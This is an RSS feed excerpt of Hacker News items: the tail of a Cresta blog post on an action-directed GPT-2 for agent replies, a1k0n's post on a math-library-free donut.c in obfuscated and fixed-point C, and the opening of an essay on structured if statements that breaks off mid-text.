<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/72cd822bf8646fe7d012f515bbedb50ed12923dc/f9666/static/03c99690032af316c57d1a672e5990a4/gpt-2-4-1.png" alt="" width="1295" height="583" srcset="https://d33wubrfki0l68.cloudfront.net/72cd822bf8646fe7d012f515bbedb50ed12923dc/f9666/static/03c99690032af316c57d1a672e5990a4/gpt-2-4-1.png 1295w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-300x135.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-1024x461.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-768x346.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-1200x540.png 1200w" sizes="(max-width: 1295px) 100vw, 1295px"></p>
<h2>Training and inference</h2>
<p>With this representation, we require action labels for messages in the training set and since there can be millions of such messages, it is not feasible to label them manually. We instead use action classification models to label agent messages in the entire training set with their corresponding actions. The messages can also be classified as no action performed, and there is no inline action label for such a case. When all the training set chats are annotated, we use the resulting text representation to train a standard GPT-2 model. GPT-2 being a causal language model, learns to map an action to its associated agent message. Training with a standard language modeling loss function and gradient descent results in the model automatically learning the relationship of the next response to the action and the chat context.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/5c531c8018ec95755a7908f0d61cfdf0a3b6e963/7367e/static/a1723095918f2185bb406593b14f4a63/gpt-2-5.png" alt="" width="1321" height="306" srcset="https://d33wubrfki0l68.cloudfront.net/5c531c8018ec95755a7908f0d61cfdf0a3b6e963/7367e/static/a1723095918f2185bb406593b14f4a63/gpt-2-5.png 1321w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-300x69.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-1024x237.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-768x178.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-1200x278.png 1200w" sizes="(max-width: 1321px) 100vw, 1321px">With this trained Action Directed GPT-2 model, given an in-progress chat and next action, we can now generate the next response which would be contextualized and follow the next action. During inference time, we take the current state of the chat, annotate each agent message with its action, take the next best action prediction of the next agent action model and convert it all to a text representation. Once we know the next action to take, there is no significant time penalty during generation so the model also demonstrates high inference performance when deployed. If the next action prediction model does not predict any action, the action directed GPT-2 model falls back to a standard language model generating a response without any action direction.</p>
<figure id="attachment_19250" aria-describedby="caption-attachment-19250"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/b10af5324f0d073c3c144bdc474936f656284493/46fdb/static/8eefb8b0eaf41e7685db2f120829fba5/gpt-2-6.png" alt="" width="2000" height="458" srcset="https://d33wubrfki0l68.cloudfront.net/b10af5324f0d073c3c144bdc474936f656284493/46fdb/static/8eefb8b0eaf41e7685db2f120829fba5/gpt-2-6.png 2000w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-300x69.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1024x234.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-768x176.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1536x352.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1200x275.png 1200w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1980x453.png 1980w" sizes="(max-width: 2000px) 100vw, 2000px"><figcaption id="caption-attachment-19250">Inference with Action Directed GPT-2</figcaption></figure>
<p>On a test set, we observe that the generations when provided with a model’s prediction of the next best action significantly improves the ability of the model to generate responses that follow the call flow.</p>
<figure id="attachment_19248" aria-describedby="caption-attachment-19248"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/bd96f5e14a8d9988cc0a4bc5cf13ef20e1dbeb39/d02ac/static/b163ddcfe338ae4fb6dbc7678a6ce2dc/gpt-2-7.png" alt="" width="1186" height="742" srcset="https://d33wubrfki0l68.cloudfront.net/bd96f5e14a8d9988cc0a4bc5cf13ef20e1dbeb39/d02ac/static/b163ddcfe338ae4fb6dbc7678a6ce2dc/gpt-2-7.png 1186w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-300x188.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-1024x641.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-768x480.png 768w" sizes="(max-width: 1186px) 100vw, 1186px"><figcaption id="caption-attachment-19248">We observe that when provided the next action labels, the Action directed GPT-2 model generates significantly better responses that are on the call-flow. These BLEU scores are measured per action categories.</figcaption></figure>
<p>We also see that the generations by Action Directed GPT-2 follow the next best action whereas Vanilla GPT-2 generations don’t necessarily follow the next best actions and generate suggestions that are all over the place.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/38b1fe0e743fe39bd52bf0305ef46b7028783b71/57dd6/static/6261bee883679e6a559c207617ea8582/gpt-2-8.png" alt="" width="1189" height="455" srcset="https://d33wubrfki0l68.cloudfront.net/38b1fe0e743fe39bd52bf0305ef46b7028783b71/57dd6/static/6261bee883679e6a559c207617ea8582/gpt-2-8.png 1189w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-300x115.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-1024x392.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-768x294.png 768w" sizes="(max-width: 1189px) 100vw, 1189px"></p>
<p>After deploying the model to our customers, we found that responses generated by the Action directed GPT-2 help the agents follow the best call flows increasing our customer’s most important sales metrics.</p>
<h2>Conclusion</h2>
<p>The exciting discovery for us was to discover how simple it is to take an off-the-shelf pre-trained language model and make it controllable without changing anything about the underlying model architecture. If you take a standard pre-trained model and finetune it on a noisy dataset, you can still make the model follow perfect behavior by directing the model correctly during runtime.</p>
<p>Since it is very simple to apply this to any new problems that require …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cresta.com/blog/action-directed-gpt-2">https://cresta.com/blog/action-directed-gpt-2</a></em></p>]]>
            </description>
            <link>https://cresta.com/blog/action-directed-gpt-2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787553</guid>
            <pubDate>Fri, 15 Jan 2021 06:02:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Donut.c Without a Math Library]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25787545">thread link</a>) | @robin_reala
<br/>
January 14, 2021 | https://www.a1k0n.net/2021/01/13/optimizing-donut.html | <a href="https://web.archive.org/web/*/https://www.a1k0n.net/2021/01/13/optimizing-donut.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    


    <div role="main">
      <div>
        

<article>
  <p>My little <a href="https://www.a1k0n.net/2011/07/20/donut-math.html">donut.c</a> has
 been making the rounds
again, after being featured in a couple YouTube videos (e.g., <a href="https://www.youtube.com/watch?v=DEqXNfs_HhY">Lex
Fridman</a> and <a href="https://www.youtube.com/watch?v=sW9npZVpiMI">Joma
Tech</a>).  If I had known how much
attention this code would get over the years, I would have spent more time on
it.</p>

<p>One thing that’s always been sort of unfortunate is the heavy use of <code>sin</code> and
<code>cos</code> – both because it necessitates linking the math library (<code>-lm</code>), but
also because it makes it much more CPU-intensive than it really needs to be.
This is especially apparent if you try to port it to an <a href="https://twitter.com/chainq/status/1297178062937825280">older
CPU</a> or an <a href="https://twitter.com/enjoy_digital/status/1341095343816118272">embedded
device</a>.</p>

<p>So, here’s a revised version with no use of <code>sin</code>, <code>cos</code>, and no need for
linking the math library (though this version still does use <code>float</code> types).</p>

<div><div><pre><code>             i,j,k,x,y,o,N;
         main(){float z[1760],a
      #define R(t,x,y) f=x;x-=t*y\
   ;y+=t*f;f=(3-x*x-y*y)/2;x*=f;y*=f;
   =0,e=1,c=1,d=0,f,g,h,G,H,A,t,D;char
 b[1760];for(;;){memset(b,32,1760);g=0,
h=1;memset(z,0,7040);for(j=0;j&lt;90;j++){
G=0,H=1;for(i=0;i&lt;314;i++){A=h+2,D=1/(G*
A*a+g*e+5);t=G*A        *e-g*a;x=40+30*D
*(H*A*d-t*c);y=          12+15*D*(H*A*c+
t*d);o=x+80*y;N          =8*((g*a-G*h*e)
*d-G*h*a-g*e-H*h        *c);if(22&gt;y&amp;&amp;y&gt;
 0&amp;&amp;x&gt;0&amp;&amp;80&gt;x&amp;&amp;D&gt;z[o]){z[o]=D;b[o]=(N&gt;0
  ?N:0)[".,-~:;=!*#$@"];}R(.02,H,G);}R(
  .07,h,g);}for(k=0;1761&gt;k;k++)putchar
   (k%80?b[k]:10);R(.04,e,a);R(.02,d,
     c);usleep(15000);printf('\n'+(
        " donut.c! \x1b[23A"));}}
          /*no math lib needed
             .@a1k0n 2021.*/
</code></pre></div></div>

<p>It’s a little misshapen and still has comments at the bottom. I used the first
frame of its output as a template and there’s <em>slightly</em> less code than filled
pixels – oh well. Output is pretty much the same as before:</p>


<pre id="d"></pre>



<p>So, how do we get sines and cosines without using <code>sin</code> and <code>cos</code>? Well, the
code doesn’t really <em>need</em> sine and cosine <em>per se</em>; what it actually does is
rotate a point around the origin in two nested loops, and also rotate two
angles just for the animation. If you’ll recall from the other article, the
inner loop is just plotting dots in a circle, which goes around another, larger
circle. In each loop, the sine/cosine terms are just moving by a small, fixed
angle.</p>

<p>So we don’t need to track the <em>angle</em> at all, we only need to start at cos=1,
sin=0 and rotate a circle around the origin to generate all the sines and
cosines we need. We just have to repeatedly apply a fixed rotation matrix:</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \begin{bmatrix}
\cos \theta &amp; -\sin \theta \\
\sin \theta &amp; \cos \theta
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>So for example, if we were to use an angle of .02 radians in our inner loop, it would look something like:</p>
<div><div><pre><code><span>float</span> <span>c</span><span>=</span><span>1</span><span>,</span> <span>s</span><span>=</span><span>0</span><span>;</span>  <span>// c for cos, s for sin</span>
<span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>314</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>  <span>// 314 * .02 ~= 2π</span>
  <span>// (use c, s in code)</span>
  <span>float</span> <span>newc</span> <span>=</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>c</span> <span>-</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>s</span><span>;</span>
  <span>s</span> <span>=</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>c</span> <span>+</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>s</span><span>;</span>
  <span>c</span> <span>=</span> <span>newc</span><span>;</span>
<span>}</span>
</code></pre></div></div>



<p>That works, but there’s a problem: no matter how precisely we define our
constants, after repeated iteration of this procedure, the magnitude of our \(\left(c, s\right)\) vector will exponentially grow or shrink over time. If we
only need to make one pass around the loop, maybe we can get away with that,
but if we have to make several (for the rotating animation, we do), we need to
fix that.</p>

<p><img src="https://www.a1k0n.net/img/sincos-mag.png" alt="sine and cosine magnitude creep"><br>
<em>an exaggerated illustration of what happens when repeatedly doing low-precision rotations</em></p>

<p>The simplest way to do that would be to multiply \(c\) and \(s\) by \(1/\sqrt{c^2 + s^2}\), but then we’re back to using the math library again. Instead, we can take
advantage of the fact that our magnitude starts out very close to 1, and we’re
going to be iterating this procedure: we can do a <a href="https://en.wikipedia.org/wiki/Newton%27s_method">Newton
step</a> after each rotation, and
that will be enough to keep the magnitude “close enough” to 1 over time.</p>

<p>Our goal is to find the reciprocal square root (<a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">sound
familiar?</a>) of \(a =
c^2 + s^2\), our \(\left(c, s\right)\) vector magnitude.  Say we define a
function \(f(x) = \frac{1}{x^2} - a\). The function is 0 when \(x =
\frac{1}{\sqrt{a}}\). We can start with an initial guess of 1 for <em>x</em>,
perform a Newton iteration to obtain <em>x’</em>, which will be “closer to”
\(\frac{1}{\sqrt{a}}\), the correct value to scale <em>c</em> and <em>s</em> by so that their
magnitude \(c^2 + s^2\) is “close to” 1 again.</p>

<p>A Newton step is defined as \(x' = x - \frac{f(x)}{f'(x)}\). I used
<a href="https://www.sympy.org/">SymPy</a> to do the derivative and simplification and
came up with \(x' = \frac{x\left(3 - a x^2\right)}{2}\). Since we’re only doing
one step, we can plug in our initial guess of 1 for \(x\) and back-substitute
\(c^2 + s^2\) for \(a\) to finally get our adjustment: \(x' = (3 - c^2 - s^2)/2\).</p>



<p>But now that we don’t have to worry so much about the magnitude of our result
(within limits), we can take another shortcut (I got this idea studying old
<a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> algorithms).  If we divide out
the cosines from our original rotation matrix, we get</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \frac{1}{\cos \theta}\begin{bmatrix}
1 &amp; -\tan \theta \\
\tan \theta &amp; 1
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>using the trig identity \(\tan \theta = \frac{\sin \theta}{\cos \theta}\).
Since we’re only dealing with small angles, the leading \(\frac{1}{\cos
\theta}\) term is close enough to 1 that we can ignore it and have our Newton
step take care of it.</p>

<p>And now we can finally understand how the rotation is done in the code. Towards
the top of the donut code is this #define, which I’ve reindented:</p>

<div><div><pre><code><span>#define R(t,x,y) \ 
</span>  <span>f</span> <span>=</span> <span>x</span><span>;</span> \
  <span>x</span> <span>-=</span> <span>t</span><span>*</span><span>y</span><span>;</span> \
  <span>y</span> <span>+=</span> <span>t</span><span>*</span><span>f</span><span>;</span> \
  <span>f</span> <span>=</span> <span>(</span><span>3</span><span>-</span><span>x</span><span>*</span><span>x</span><span>-</span><span>y</span><span>*</span><span>y</span><span>)</span><span>/</span><span>2</span><span>;</span> \
  <span>x</span> <span>*=</span> <span>f</span><span>;</span> \
  <span>y</span> <span>*=</span> <span>f</span><span>;</span>
</code></pre></div></div>

<p>This does an in-place rotation of a unit vector <code>x, y</code> where <code>t</code> is \(\tan
\theta\). <code>f</code> is a temporary variable; the first three lines do the “matrix
multiplication” on <code>x, y</code>. <code>f</code> is then re-used to get the magnitude adjustment,
and then finally <code>x</code> and <code>y</code> are multiplied by <code>f</code> which moves them back onto
the unit circle.</p>

<p>With that operation in hand, I just replaced all the angles with their sines
and cosines and ran the rotation operator <code>R()</code> instead of calling <code>sin</code>/<code>cos</code>.
The code is otherwise identical.</p>



<p>We can use exactly the same ideas with integer fixed-point arithmetic, and not
use any <code>float</code> math whatsoever. I’ve redone all the math with 10-bit precision
and produced the following C code which runs well on embedded devices which can
do 32-bit multiplications and have ~4k of available RAM:</p>

<div><div><pre><code><span>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
</span>
<span>#define R(mul,shift,x,y) \
  _=x; \
  x -= mul*y&gt;&gt;shift; \
  y += mul*_&gt;&gt;shift; \
  _ = 3145728-x*x-y*y&gt;&gt;11; \
  x = x*_&gt;&gt;10; \
  y = y*_&gt;&gt;10;
</span>
<span>int8_t</span> <span>b</span><span>[</span><span>1760</span><span>],</span> <span>z</span><span>[</span><span>1760</span><span>];</span>

<span>void</span> <span>main</span><span>()</span> <span>{</span>
  <span>int</span> <span>sA</span><span>=</span><span>1024</span><span>,</span><span>cA</span><span>=</span><span>0</span><span>,</span><span>sB</span><span>=</span><span>1024</span><span>,</span><span>cB</span><span>=</span><span>0</span><span>,</span><span>_</span><span>;</span>
  <span>for</span> <span>(;;)</span> <span>{</span>
    <span>memset</span><span>(</span><span>b</span><span>,</span> <span>32</span><span>,</span> <span>1760</span><span>);</span>  <span>// text buffer</span>
    <span>memset</span><span>(</span><span>z</span><span>,</span> <span>127</span><span>,</span> <span>1760</span><span>);</span>   <span>// z buffer</span>
    <span>int</span> <span>sj</span><span>=</span><span>0</span><span>,</span> <span>cj</span><span>=</span><span>1024</span><span>;</span>
    <span>for</span> <span>(</span><span>int</span> <span>j</span> <span>=</span> <span>0</span><span>;</span> <span>j</span> <span>&lt;</span> <span>90</span><span>;</span> <span>j</span><span>++</span><span>)</span> <span>{</span>
      <span>int</span> <span>si</span> <span>=</span> <span>0</span><span>,</span> <span>ci</span> <span>=</span> <span>1024</span><span>;</span>  <span>// sine and cosine of angle i</span>
      <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>324</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
        <span>int</span> <span>R1</span> <span>=</span> <span>1</span><span>,</span> <span>R2</span> <span>=</span> <span>2048</span><span>,</span> <span>K2</span> <span>=</span> <span>5120</span><span>*</span><span>1024</span><span>;</span>

        <span>int</span> <span>x0</span> <span>=</span> <span>R1</span><span>*</span><span>cj</span> <span>+</span> <span>R2</span><span>,</span>
            <span>x1</span> <span>=</span> <span>ci</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x2</span> <span>=</span> <span>cA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x3</span> <span>=</span> <span>si</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x4</span> <span>=</span> <span>R1</span><span>*</span><span>x2</span> <span>-</span> <span>(</span><span>sA</span><span>*</span><span>x3</span> <span>&gt;&gt;</span> <span>10</span><span>),</span>
            <span>x5</span> <span>=</span> <span>sA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x6</span> <span>=</span> <span>K2</span> <span>+</span> <span>R1</span><span>*</span><span>1024</span><span>*</span><span>x5</span> <span>+</span> <span>cA</span><span>*</span><span>x3</span><span>,</span>
            <span>x7</span> <span>=</span> <span>cj</span><span>*</span><span>si</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x</span> <span>=</span> <span>40</span> <span>+</span> <span>30</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x1</span> <span>-</span> <span>sB</span><span>*</span><span>x4</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>y</span> <span>=</span> <span>12</span> <span>+</span> <span>15</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x4</span> <span>+</span> <span>sB</span><span>*</span><span>x1</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>N</span> <span>=</span> <span>(</span><span>-</span><span>cA</span><span>*</span><span>x7</span> <span>-</span> <span>cB</span><span>*</span><span>((</span><span>-</span><span>sA</span><span>*</span><span>x7</span><span>&gt;&gt;</span><span>10</span><span>)</span> <span>+</span> <span>x2</span><span>)</span> <span>-</span> <span>ci</span><span>*</span><span>(</span><span>cj</span><span>*</span><span>sB</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>-</span> <span>x5</span> <span>&gt;&gt;</span> <span>7</span><span>;</span>

        <span>int</span> <span>o</span> <span>=</span> <span>x</span> <span>+</span> <span>80</span> <span>*</span> <span>y</span><span>;</span>
        <span>int8_t</span> <span>zz</span> <span>=</span> <span>(</span><span>x6</span><span>-</span><span>K2</span><span>)</span><span>&gt;&gt;</span><span>15</span><span>;</span>
        <span>if</span> <span>(</span><span>22</span> <span>&gt;</span> <span>y</span> <span>&amp;&amp;</span> <span>y</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>x</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>80</span> <span>&gt;</span> <span>x</span> <span>&amp;&amp;</span> <span>zz</span> <span>&lt;</span> <span>z</span><span>[</span><span>o</span><span>])</span> <span>{</span>
          <span>z</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>zz</span><span>;</span>
          <span>b</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>".,-~:;=!*#$@"</span><span>[</span><span>N</span> <span>&gt;</span> <span>0</span> <span>?</span> <span>N</span> <span>:</span> <span>0</span><span>];</span>
        <span>}</span>
        <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>ci</span><span>,</span> <span>si</span><span>)</span>  <span>// rotate i</span>
      <span>}</span>
      <span>R</span><span>(</span><span>9</span><span>,</span> <span>7</span><span>,</span> <span>cj</span><span>,</span> <span>sj</span><span>)</span>  <span>// rotate j</span>
    <span>}</span>
    <span>for</span> <span>(</span><span>int</span> <span>k</span> <span>=</span> <span>0</span><span>;</span> <span>1761</span> <span>&gt;</span> <span>k</span><span>;</span> <span>k</span><span>++</span><span>)</span>
      <span>putchar</span><span>(</span><span>k</span> <span>%</span> <span>80</span> <span>?</span> <span>b</span><span>[</span><span>k</span><span>]</span> <span>:</span> <span>10</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>7</span><span>,</span> <span>cA</span><span>,</span> <span>sA</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>cB</span><span>,</span> <span>sB</span><span>);</span>
    <span>usleep</span><span>(</span><span>15000</span><span>);</span>
    <span>printf</span><span>(</span><span>"</span><span>\x1b</span><span>[23A"</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The output is pretty much the same.</p>

</article>







      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://www.a1k0n.net/2021/01/13/optimizing-donut.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787545</guid>
            <pubDate>Fri, 15 Jan 2021 06:01:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Structured programming: how to write proper if statements]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25786956">thread link</a>) | @harporoeder
<br/>
January 14, 2021 | http://boris-marinov.github.io/if/ | <a href="https://web.archive.org/web/*/http://boris-marinov.github.io/if/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The <code>if</code> statement (or <code>if</code> expression) is the cornerstone of every modern programming language - it is so pervasive that we rarely think about how exactly should we use it, or how it is meant to be used. But despite its popularity, <code>if</code> wasnâ€™t always there, and it wasnâ€™t as pervasive as nowadays, so its role is, Iâ€™d argue, still somewhat misunderstood. So in this article, I will examine some mistakes that we can easily avoid in order to improve on our code.</p>

<!--more-->



<p>This is an opinionated text, i.e. it contains my opinions and although I have many arguments that back them, they are ultimately based on <em>my</em> core beliefs about what programming is and should be, so take them as advice, as opposed to a dogma. And here are some of the things on which this advice is based on, structured as postulates.</p>

<blockquote>
  <p>Code is for humans (and programmers are humans too).</p>
</blockquote>

<p>A form of this appears in a little book known in the hacker community as â€œSICPâ€�, but I donâ€™t know if they were the first to state it. It means that programs are not just instructions for performing a given task - they are text, and as such they should be subject to the same stylistical rules as other text is.</p>

<blockquote>
  <p>Code should be as bug-free as possible (and easy to debug as well).</p>
</blockquote>

<p>This one looks pretty self-explanatory, but the key point is that we have to dedicate effort to make it such, by constantly thinking not only about ways in which the code might go wrong, but also about ways to diagnose potential problems.</p>

<p>I guess I should say something about why I believe these things. Simple - because all other approaches just fail because of the human factor, e.g. any code, that is written without regard for style is bound to become legacy when the person who supports it leaves. Likewise, maintaining code that lacks structure results in bugs (which often can be fixed only by imposing more structure).</p>

<p>Lastly, people often contrast good structure and readability with speed. Firstly, the comparison is a bit unfair, because a well-structured is easier to optimize. And for cases in which it is really the case, in 99% the gain is so little that nobody cares, so the emphasis should remain on readability and structure even then. This is when I would throw this very famous quote by DEK:</p>

<blockquote>
  <p>Programmers waste enormous amounts of time thinking about, or worrying about, the speed of noncritical parts of their programs, and these attempts at efficiency actually have a strong negative impact when debugging and maintenance are considered. We should forget about small efficiencies, say about 97 % of the time: pre mature optimization is the root of all evil.
<a href="http://www.kohala.com/start/papers.others/knuth.dec74.html">source</a></p>
</blockquote>

<p>Keep in mind that he wrote this when computers were a thousand times slower than today, so we should care about maintainability even more.</p>



<p>Once upon a time, all there was was the assembly language where people didnâ€™t have brackets and had to use <code>jump</code> instructions instead. For those who donâ€™t know what jump does, if you imagine that somewhere in the virtual machine, or the interpreter, that runs your code there is a variable that denotes which line of code should be executed next, then <code>jump</code> is a functionality that basically allows you to set that variable to whatever value you please - it is like a portal that allows you to go to from any place of the program to any other place. For example, a typical <code>if</code> statement that looks like this when written with jumps:</p>

<div><div><pre><code>compare input to waterlevel
if less, jump to A
if equal, jump to B
jump to C

A:
turn motor on
jump to C

B:
turn motor off
C:
...
</code></pre></div></div>
<p><a href="https://stackoverflow.com/questions/40602029/how-to-write-if-else-in-assembly">Source for the assembly pseudocode</a></p>

<p>You can see from this example that, although powerful, jumps are much harder to work with than <code>if</code>-s, although they can sometimes make your code a bit shorter, they will 100% make it less readable which is hardly a good deal - if the important thing is for code to bug free, so youâ€™d always prefer to have a longer and more readable piece of code, than one which is shorter but harder to understand. This realization led to the rise of what was at the time called â€œstructural programmingâ€� paradigm, which was based on the idea that the power of jumps should not be exposed to the programmer - a point which was brought by Edsger W. Dijkstra in the seminal essay <a href="http://www.u.arizona.edu/~rubinson/copyright_violations/Go_To_Considered_Harmful.html">Go To Statement Considered Harmful</a> (<code>goto</code> is the equivalent of a <code>jump</code> instruction statements in non-assembly language context). Simultaneously, the idea of a <em>block</em> (or a â€œcompound statementâ€�) meaning a collection statements that perform a common task (usually denoted today by wrapping them in curly brackets) was pushed forward, and the two ideas gave birth to the <code>if</code> statement that we know today (that <a href="https://craftofcoding.wordpress.com/2017/04/29/the-evolution-of-if-i-from-fortran-i-to-algol-60/">first appeared in the <em>Algol 60</em> programming language</a>):</p>

<div><div><pre><code>if (input less than waterlevel) {
  turn motor on
} else if (input equal to waterlevel) {
turn motor off
} else {
...
</code></pre></div></div>

<p>The adoption of structured programming was a long process which began with people even questioning whether structured programs are even capable of encoding all possible computations, but today, although some people are <a href="https://stackoverflow.com/questions/46586/goto-still-considered-harmful">still defending the use of goto</a>, it (the process) is largely finished - <code>goto</code> is banished and the structured style of programming is so pervasive across modern languages that the term â€œstructuredâ€� is not used any more, simply because there is nothing to contrast it with.</p>

<p>And to reiterate, the reasons for this are quite obvious - using brackets makes our code much more akin to the way we usually talk and write with each other: we often say</p>

<blockquote>
  <p>â€œif A then B otherwise Câ€�</p>
</blockquote>

<p>we never say things like,</p>

<blockquote>
  <p>â€œif A then go to the previous page and start reading from line 12â€�.</p>
</blockquote>

<p>(I wonder if the programmers who defend the use of <code>goto</code> write and talk like that?)</p>

<p>This already leads me to the first rule that I always follow.</p>



<p>A leftover from the <code>goto</code>-driven style of programming is the possibility of so-called â€œearly exitâ€� - the ability to quit the execution of a given function or method from any place of itâ€™s body (most-oftenly by using the keyword <code>return</code>) as opposed to executing the function to the end. So again if we consider our plain old <code>if</code> <code>else</code> statement:</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
} else {
    turn motor off
}
...
</code></pre></div></div>
<p>Using <code>return</code> we can write it like this</p>

<div><div><pre><code>if (input less than waterleve) {
    return turn motor on
} 
turn motor off
...
</code></pre></div></div>

<p>When used like this, <code>return</code> is directly translatable to a <code>goto</code>.</p>

<div><div><pre><code>if (input less than waterleve) {
    turn motor on
    Jump to C
}
turn motor off
C:
...
</code></pre></div></div>

<p>Why not write like this? We already established that <code>goto</code> is bad and Iâ€™d argue that mixing the two approaches is even worse in some respects, as it might fool you that the code is structured when it really isnâ€™t. Furthermore, the early exit makes our code as confusing as any other <code>goto</code>-containing code when translated to natural language. Imagine someone saying:</p>

<blockquote>
  <p>â€œBring me a coffee if you get home early.â€�</p>
</blockquote>

<p>and then imagine them saying.</p>

<blockquote>
  <p>â€œIf you donâ€™t get home early ignore everything Iâ€™d say after this sentence. Bring me a coffee.â€�</p>
</blockquote>

<p>So if your language supports it, always rely on the implicit <code>return</code> instead of explicitly ending your execution. If not, the simple rule you can follow is that you should either return from all branches of the <code>if</code> statement or from none of them.</p>

<h2 id="combining-ifs-with-functions">Combining <code>if</code>â€™s with functions</h2>

<p>The most common type of situation that I have seen the premature <code>return</code> pattern is for handling errors. Imagine for example a very long function with some validation at the beginning. Many people would write:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } 

  create account for user
  sign user up
  initialise some other stuff
  write action in log
  send emails
  ...
}
</code></pre></div></div>

<p>This is a very subtle variant of the issue I am describing (made even more subtle by the fact that <code>throw</code> is used instead of a <code>return</code>). The correct way would be:</p>

<div><div><pre><code>signup (user) {

  if (username is valid ) {
      throw invalid username
  } else {
      create account for user
      sign user up
      initialise some other stuff
      write action in log
      send emails
    ...
  }
}
</code></pre></div></div>

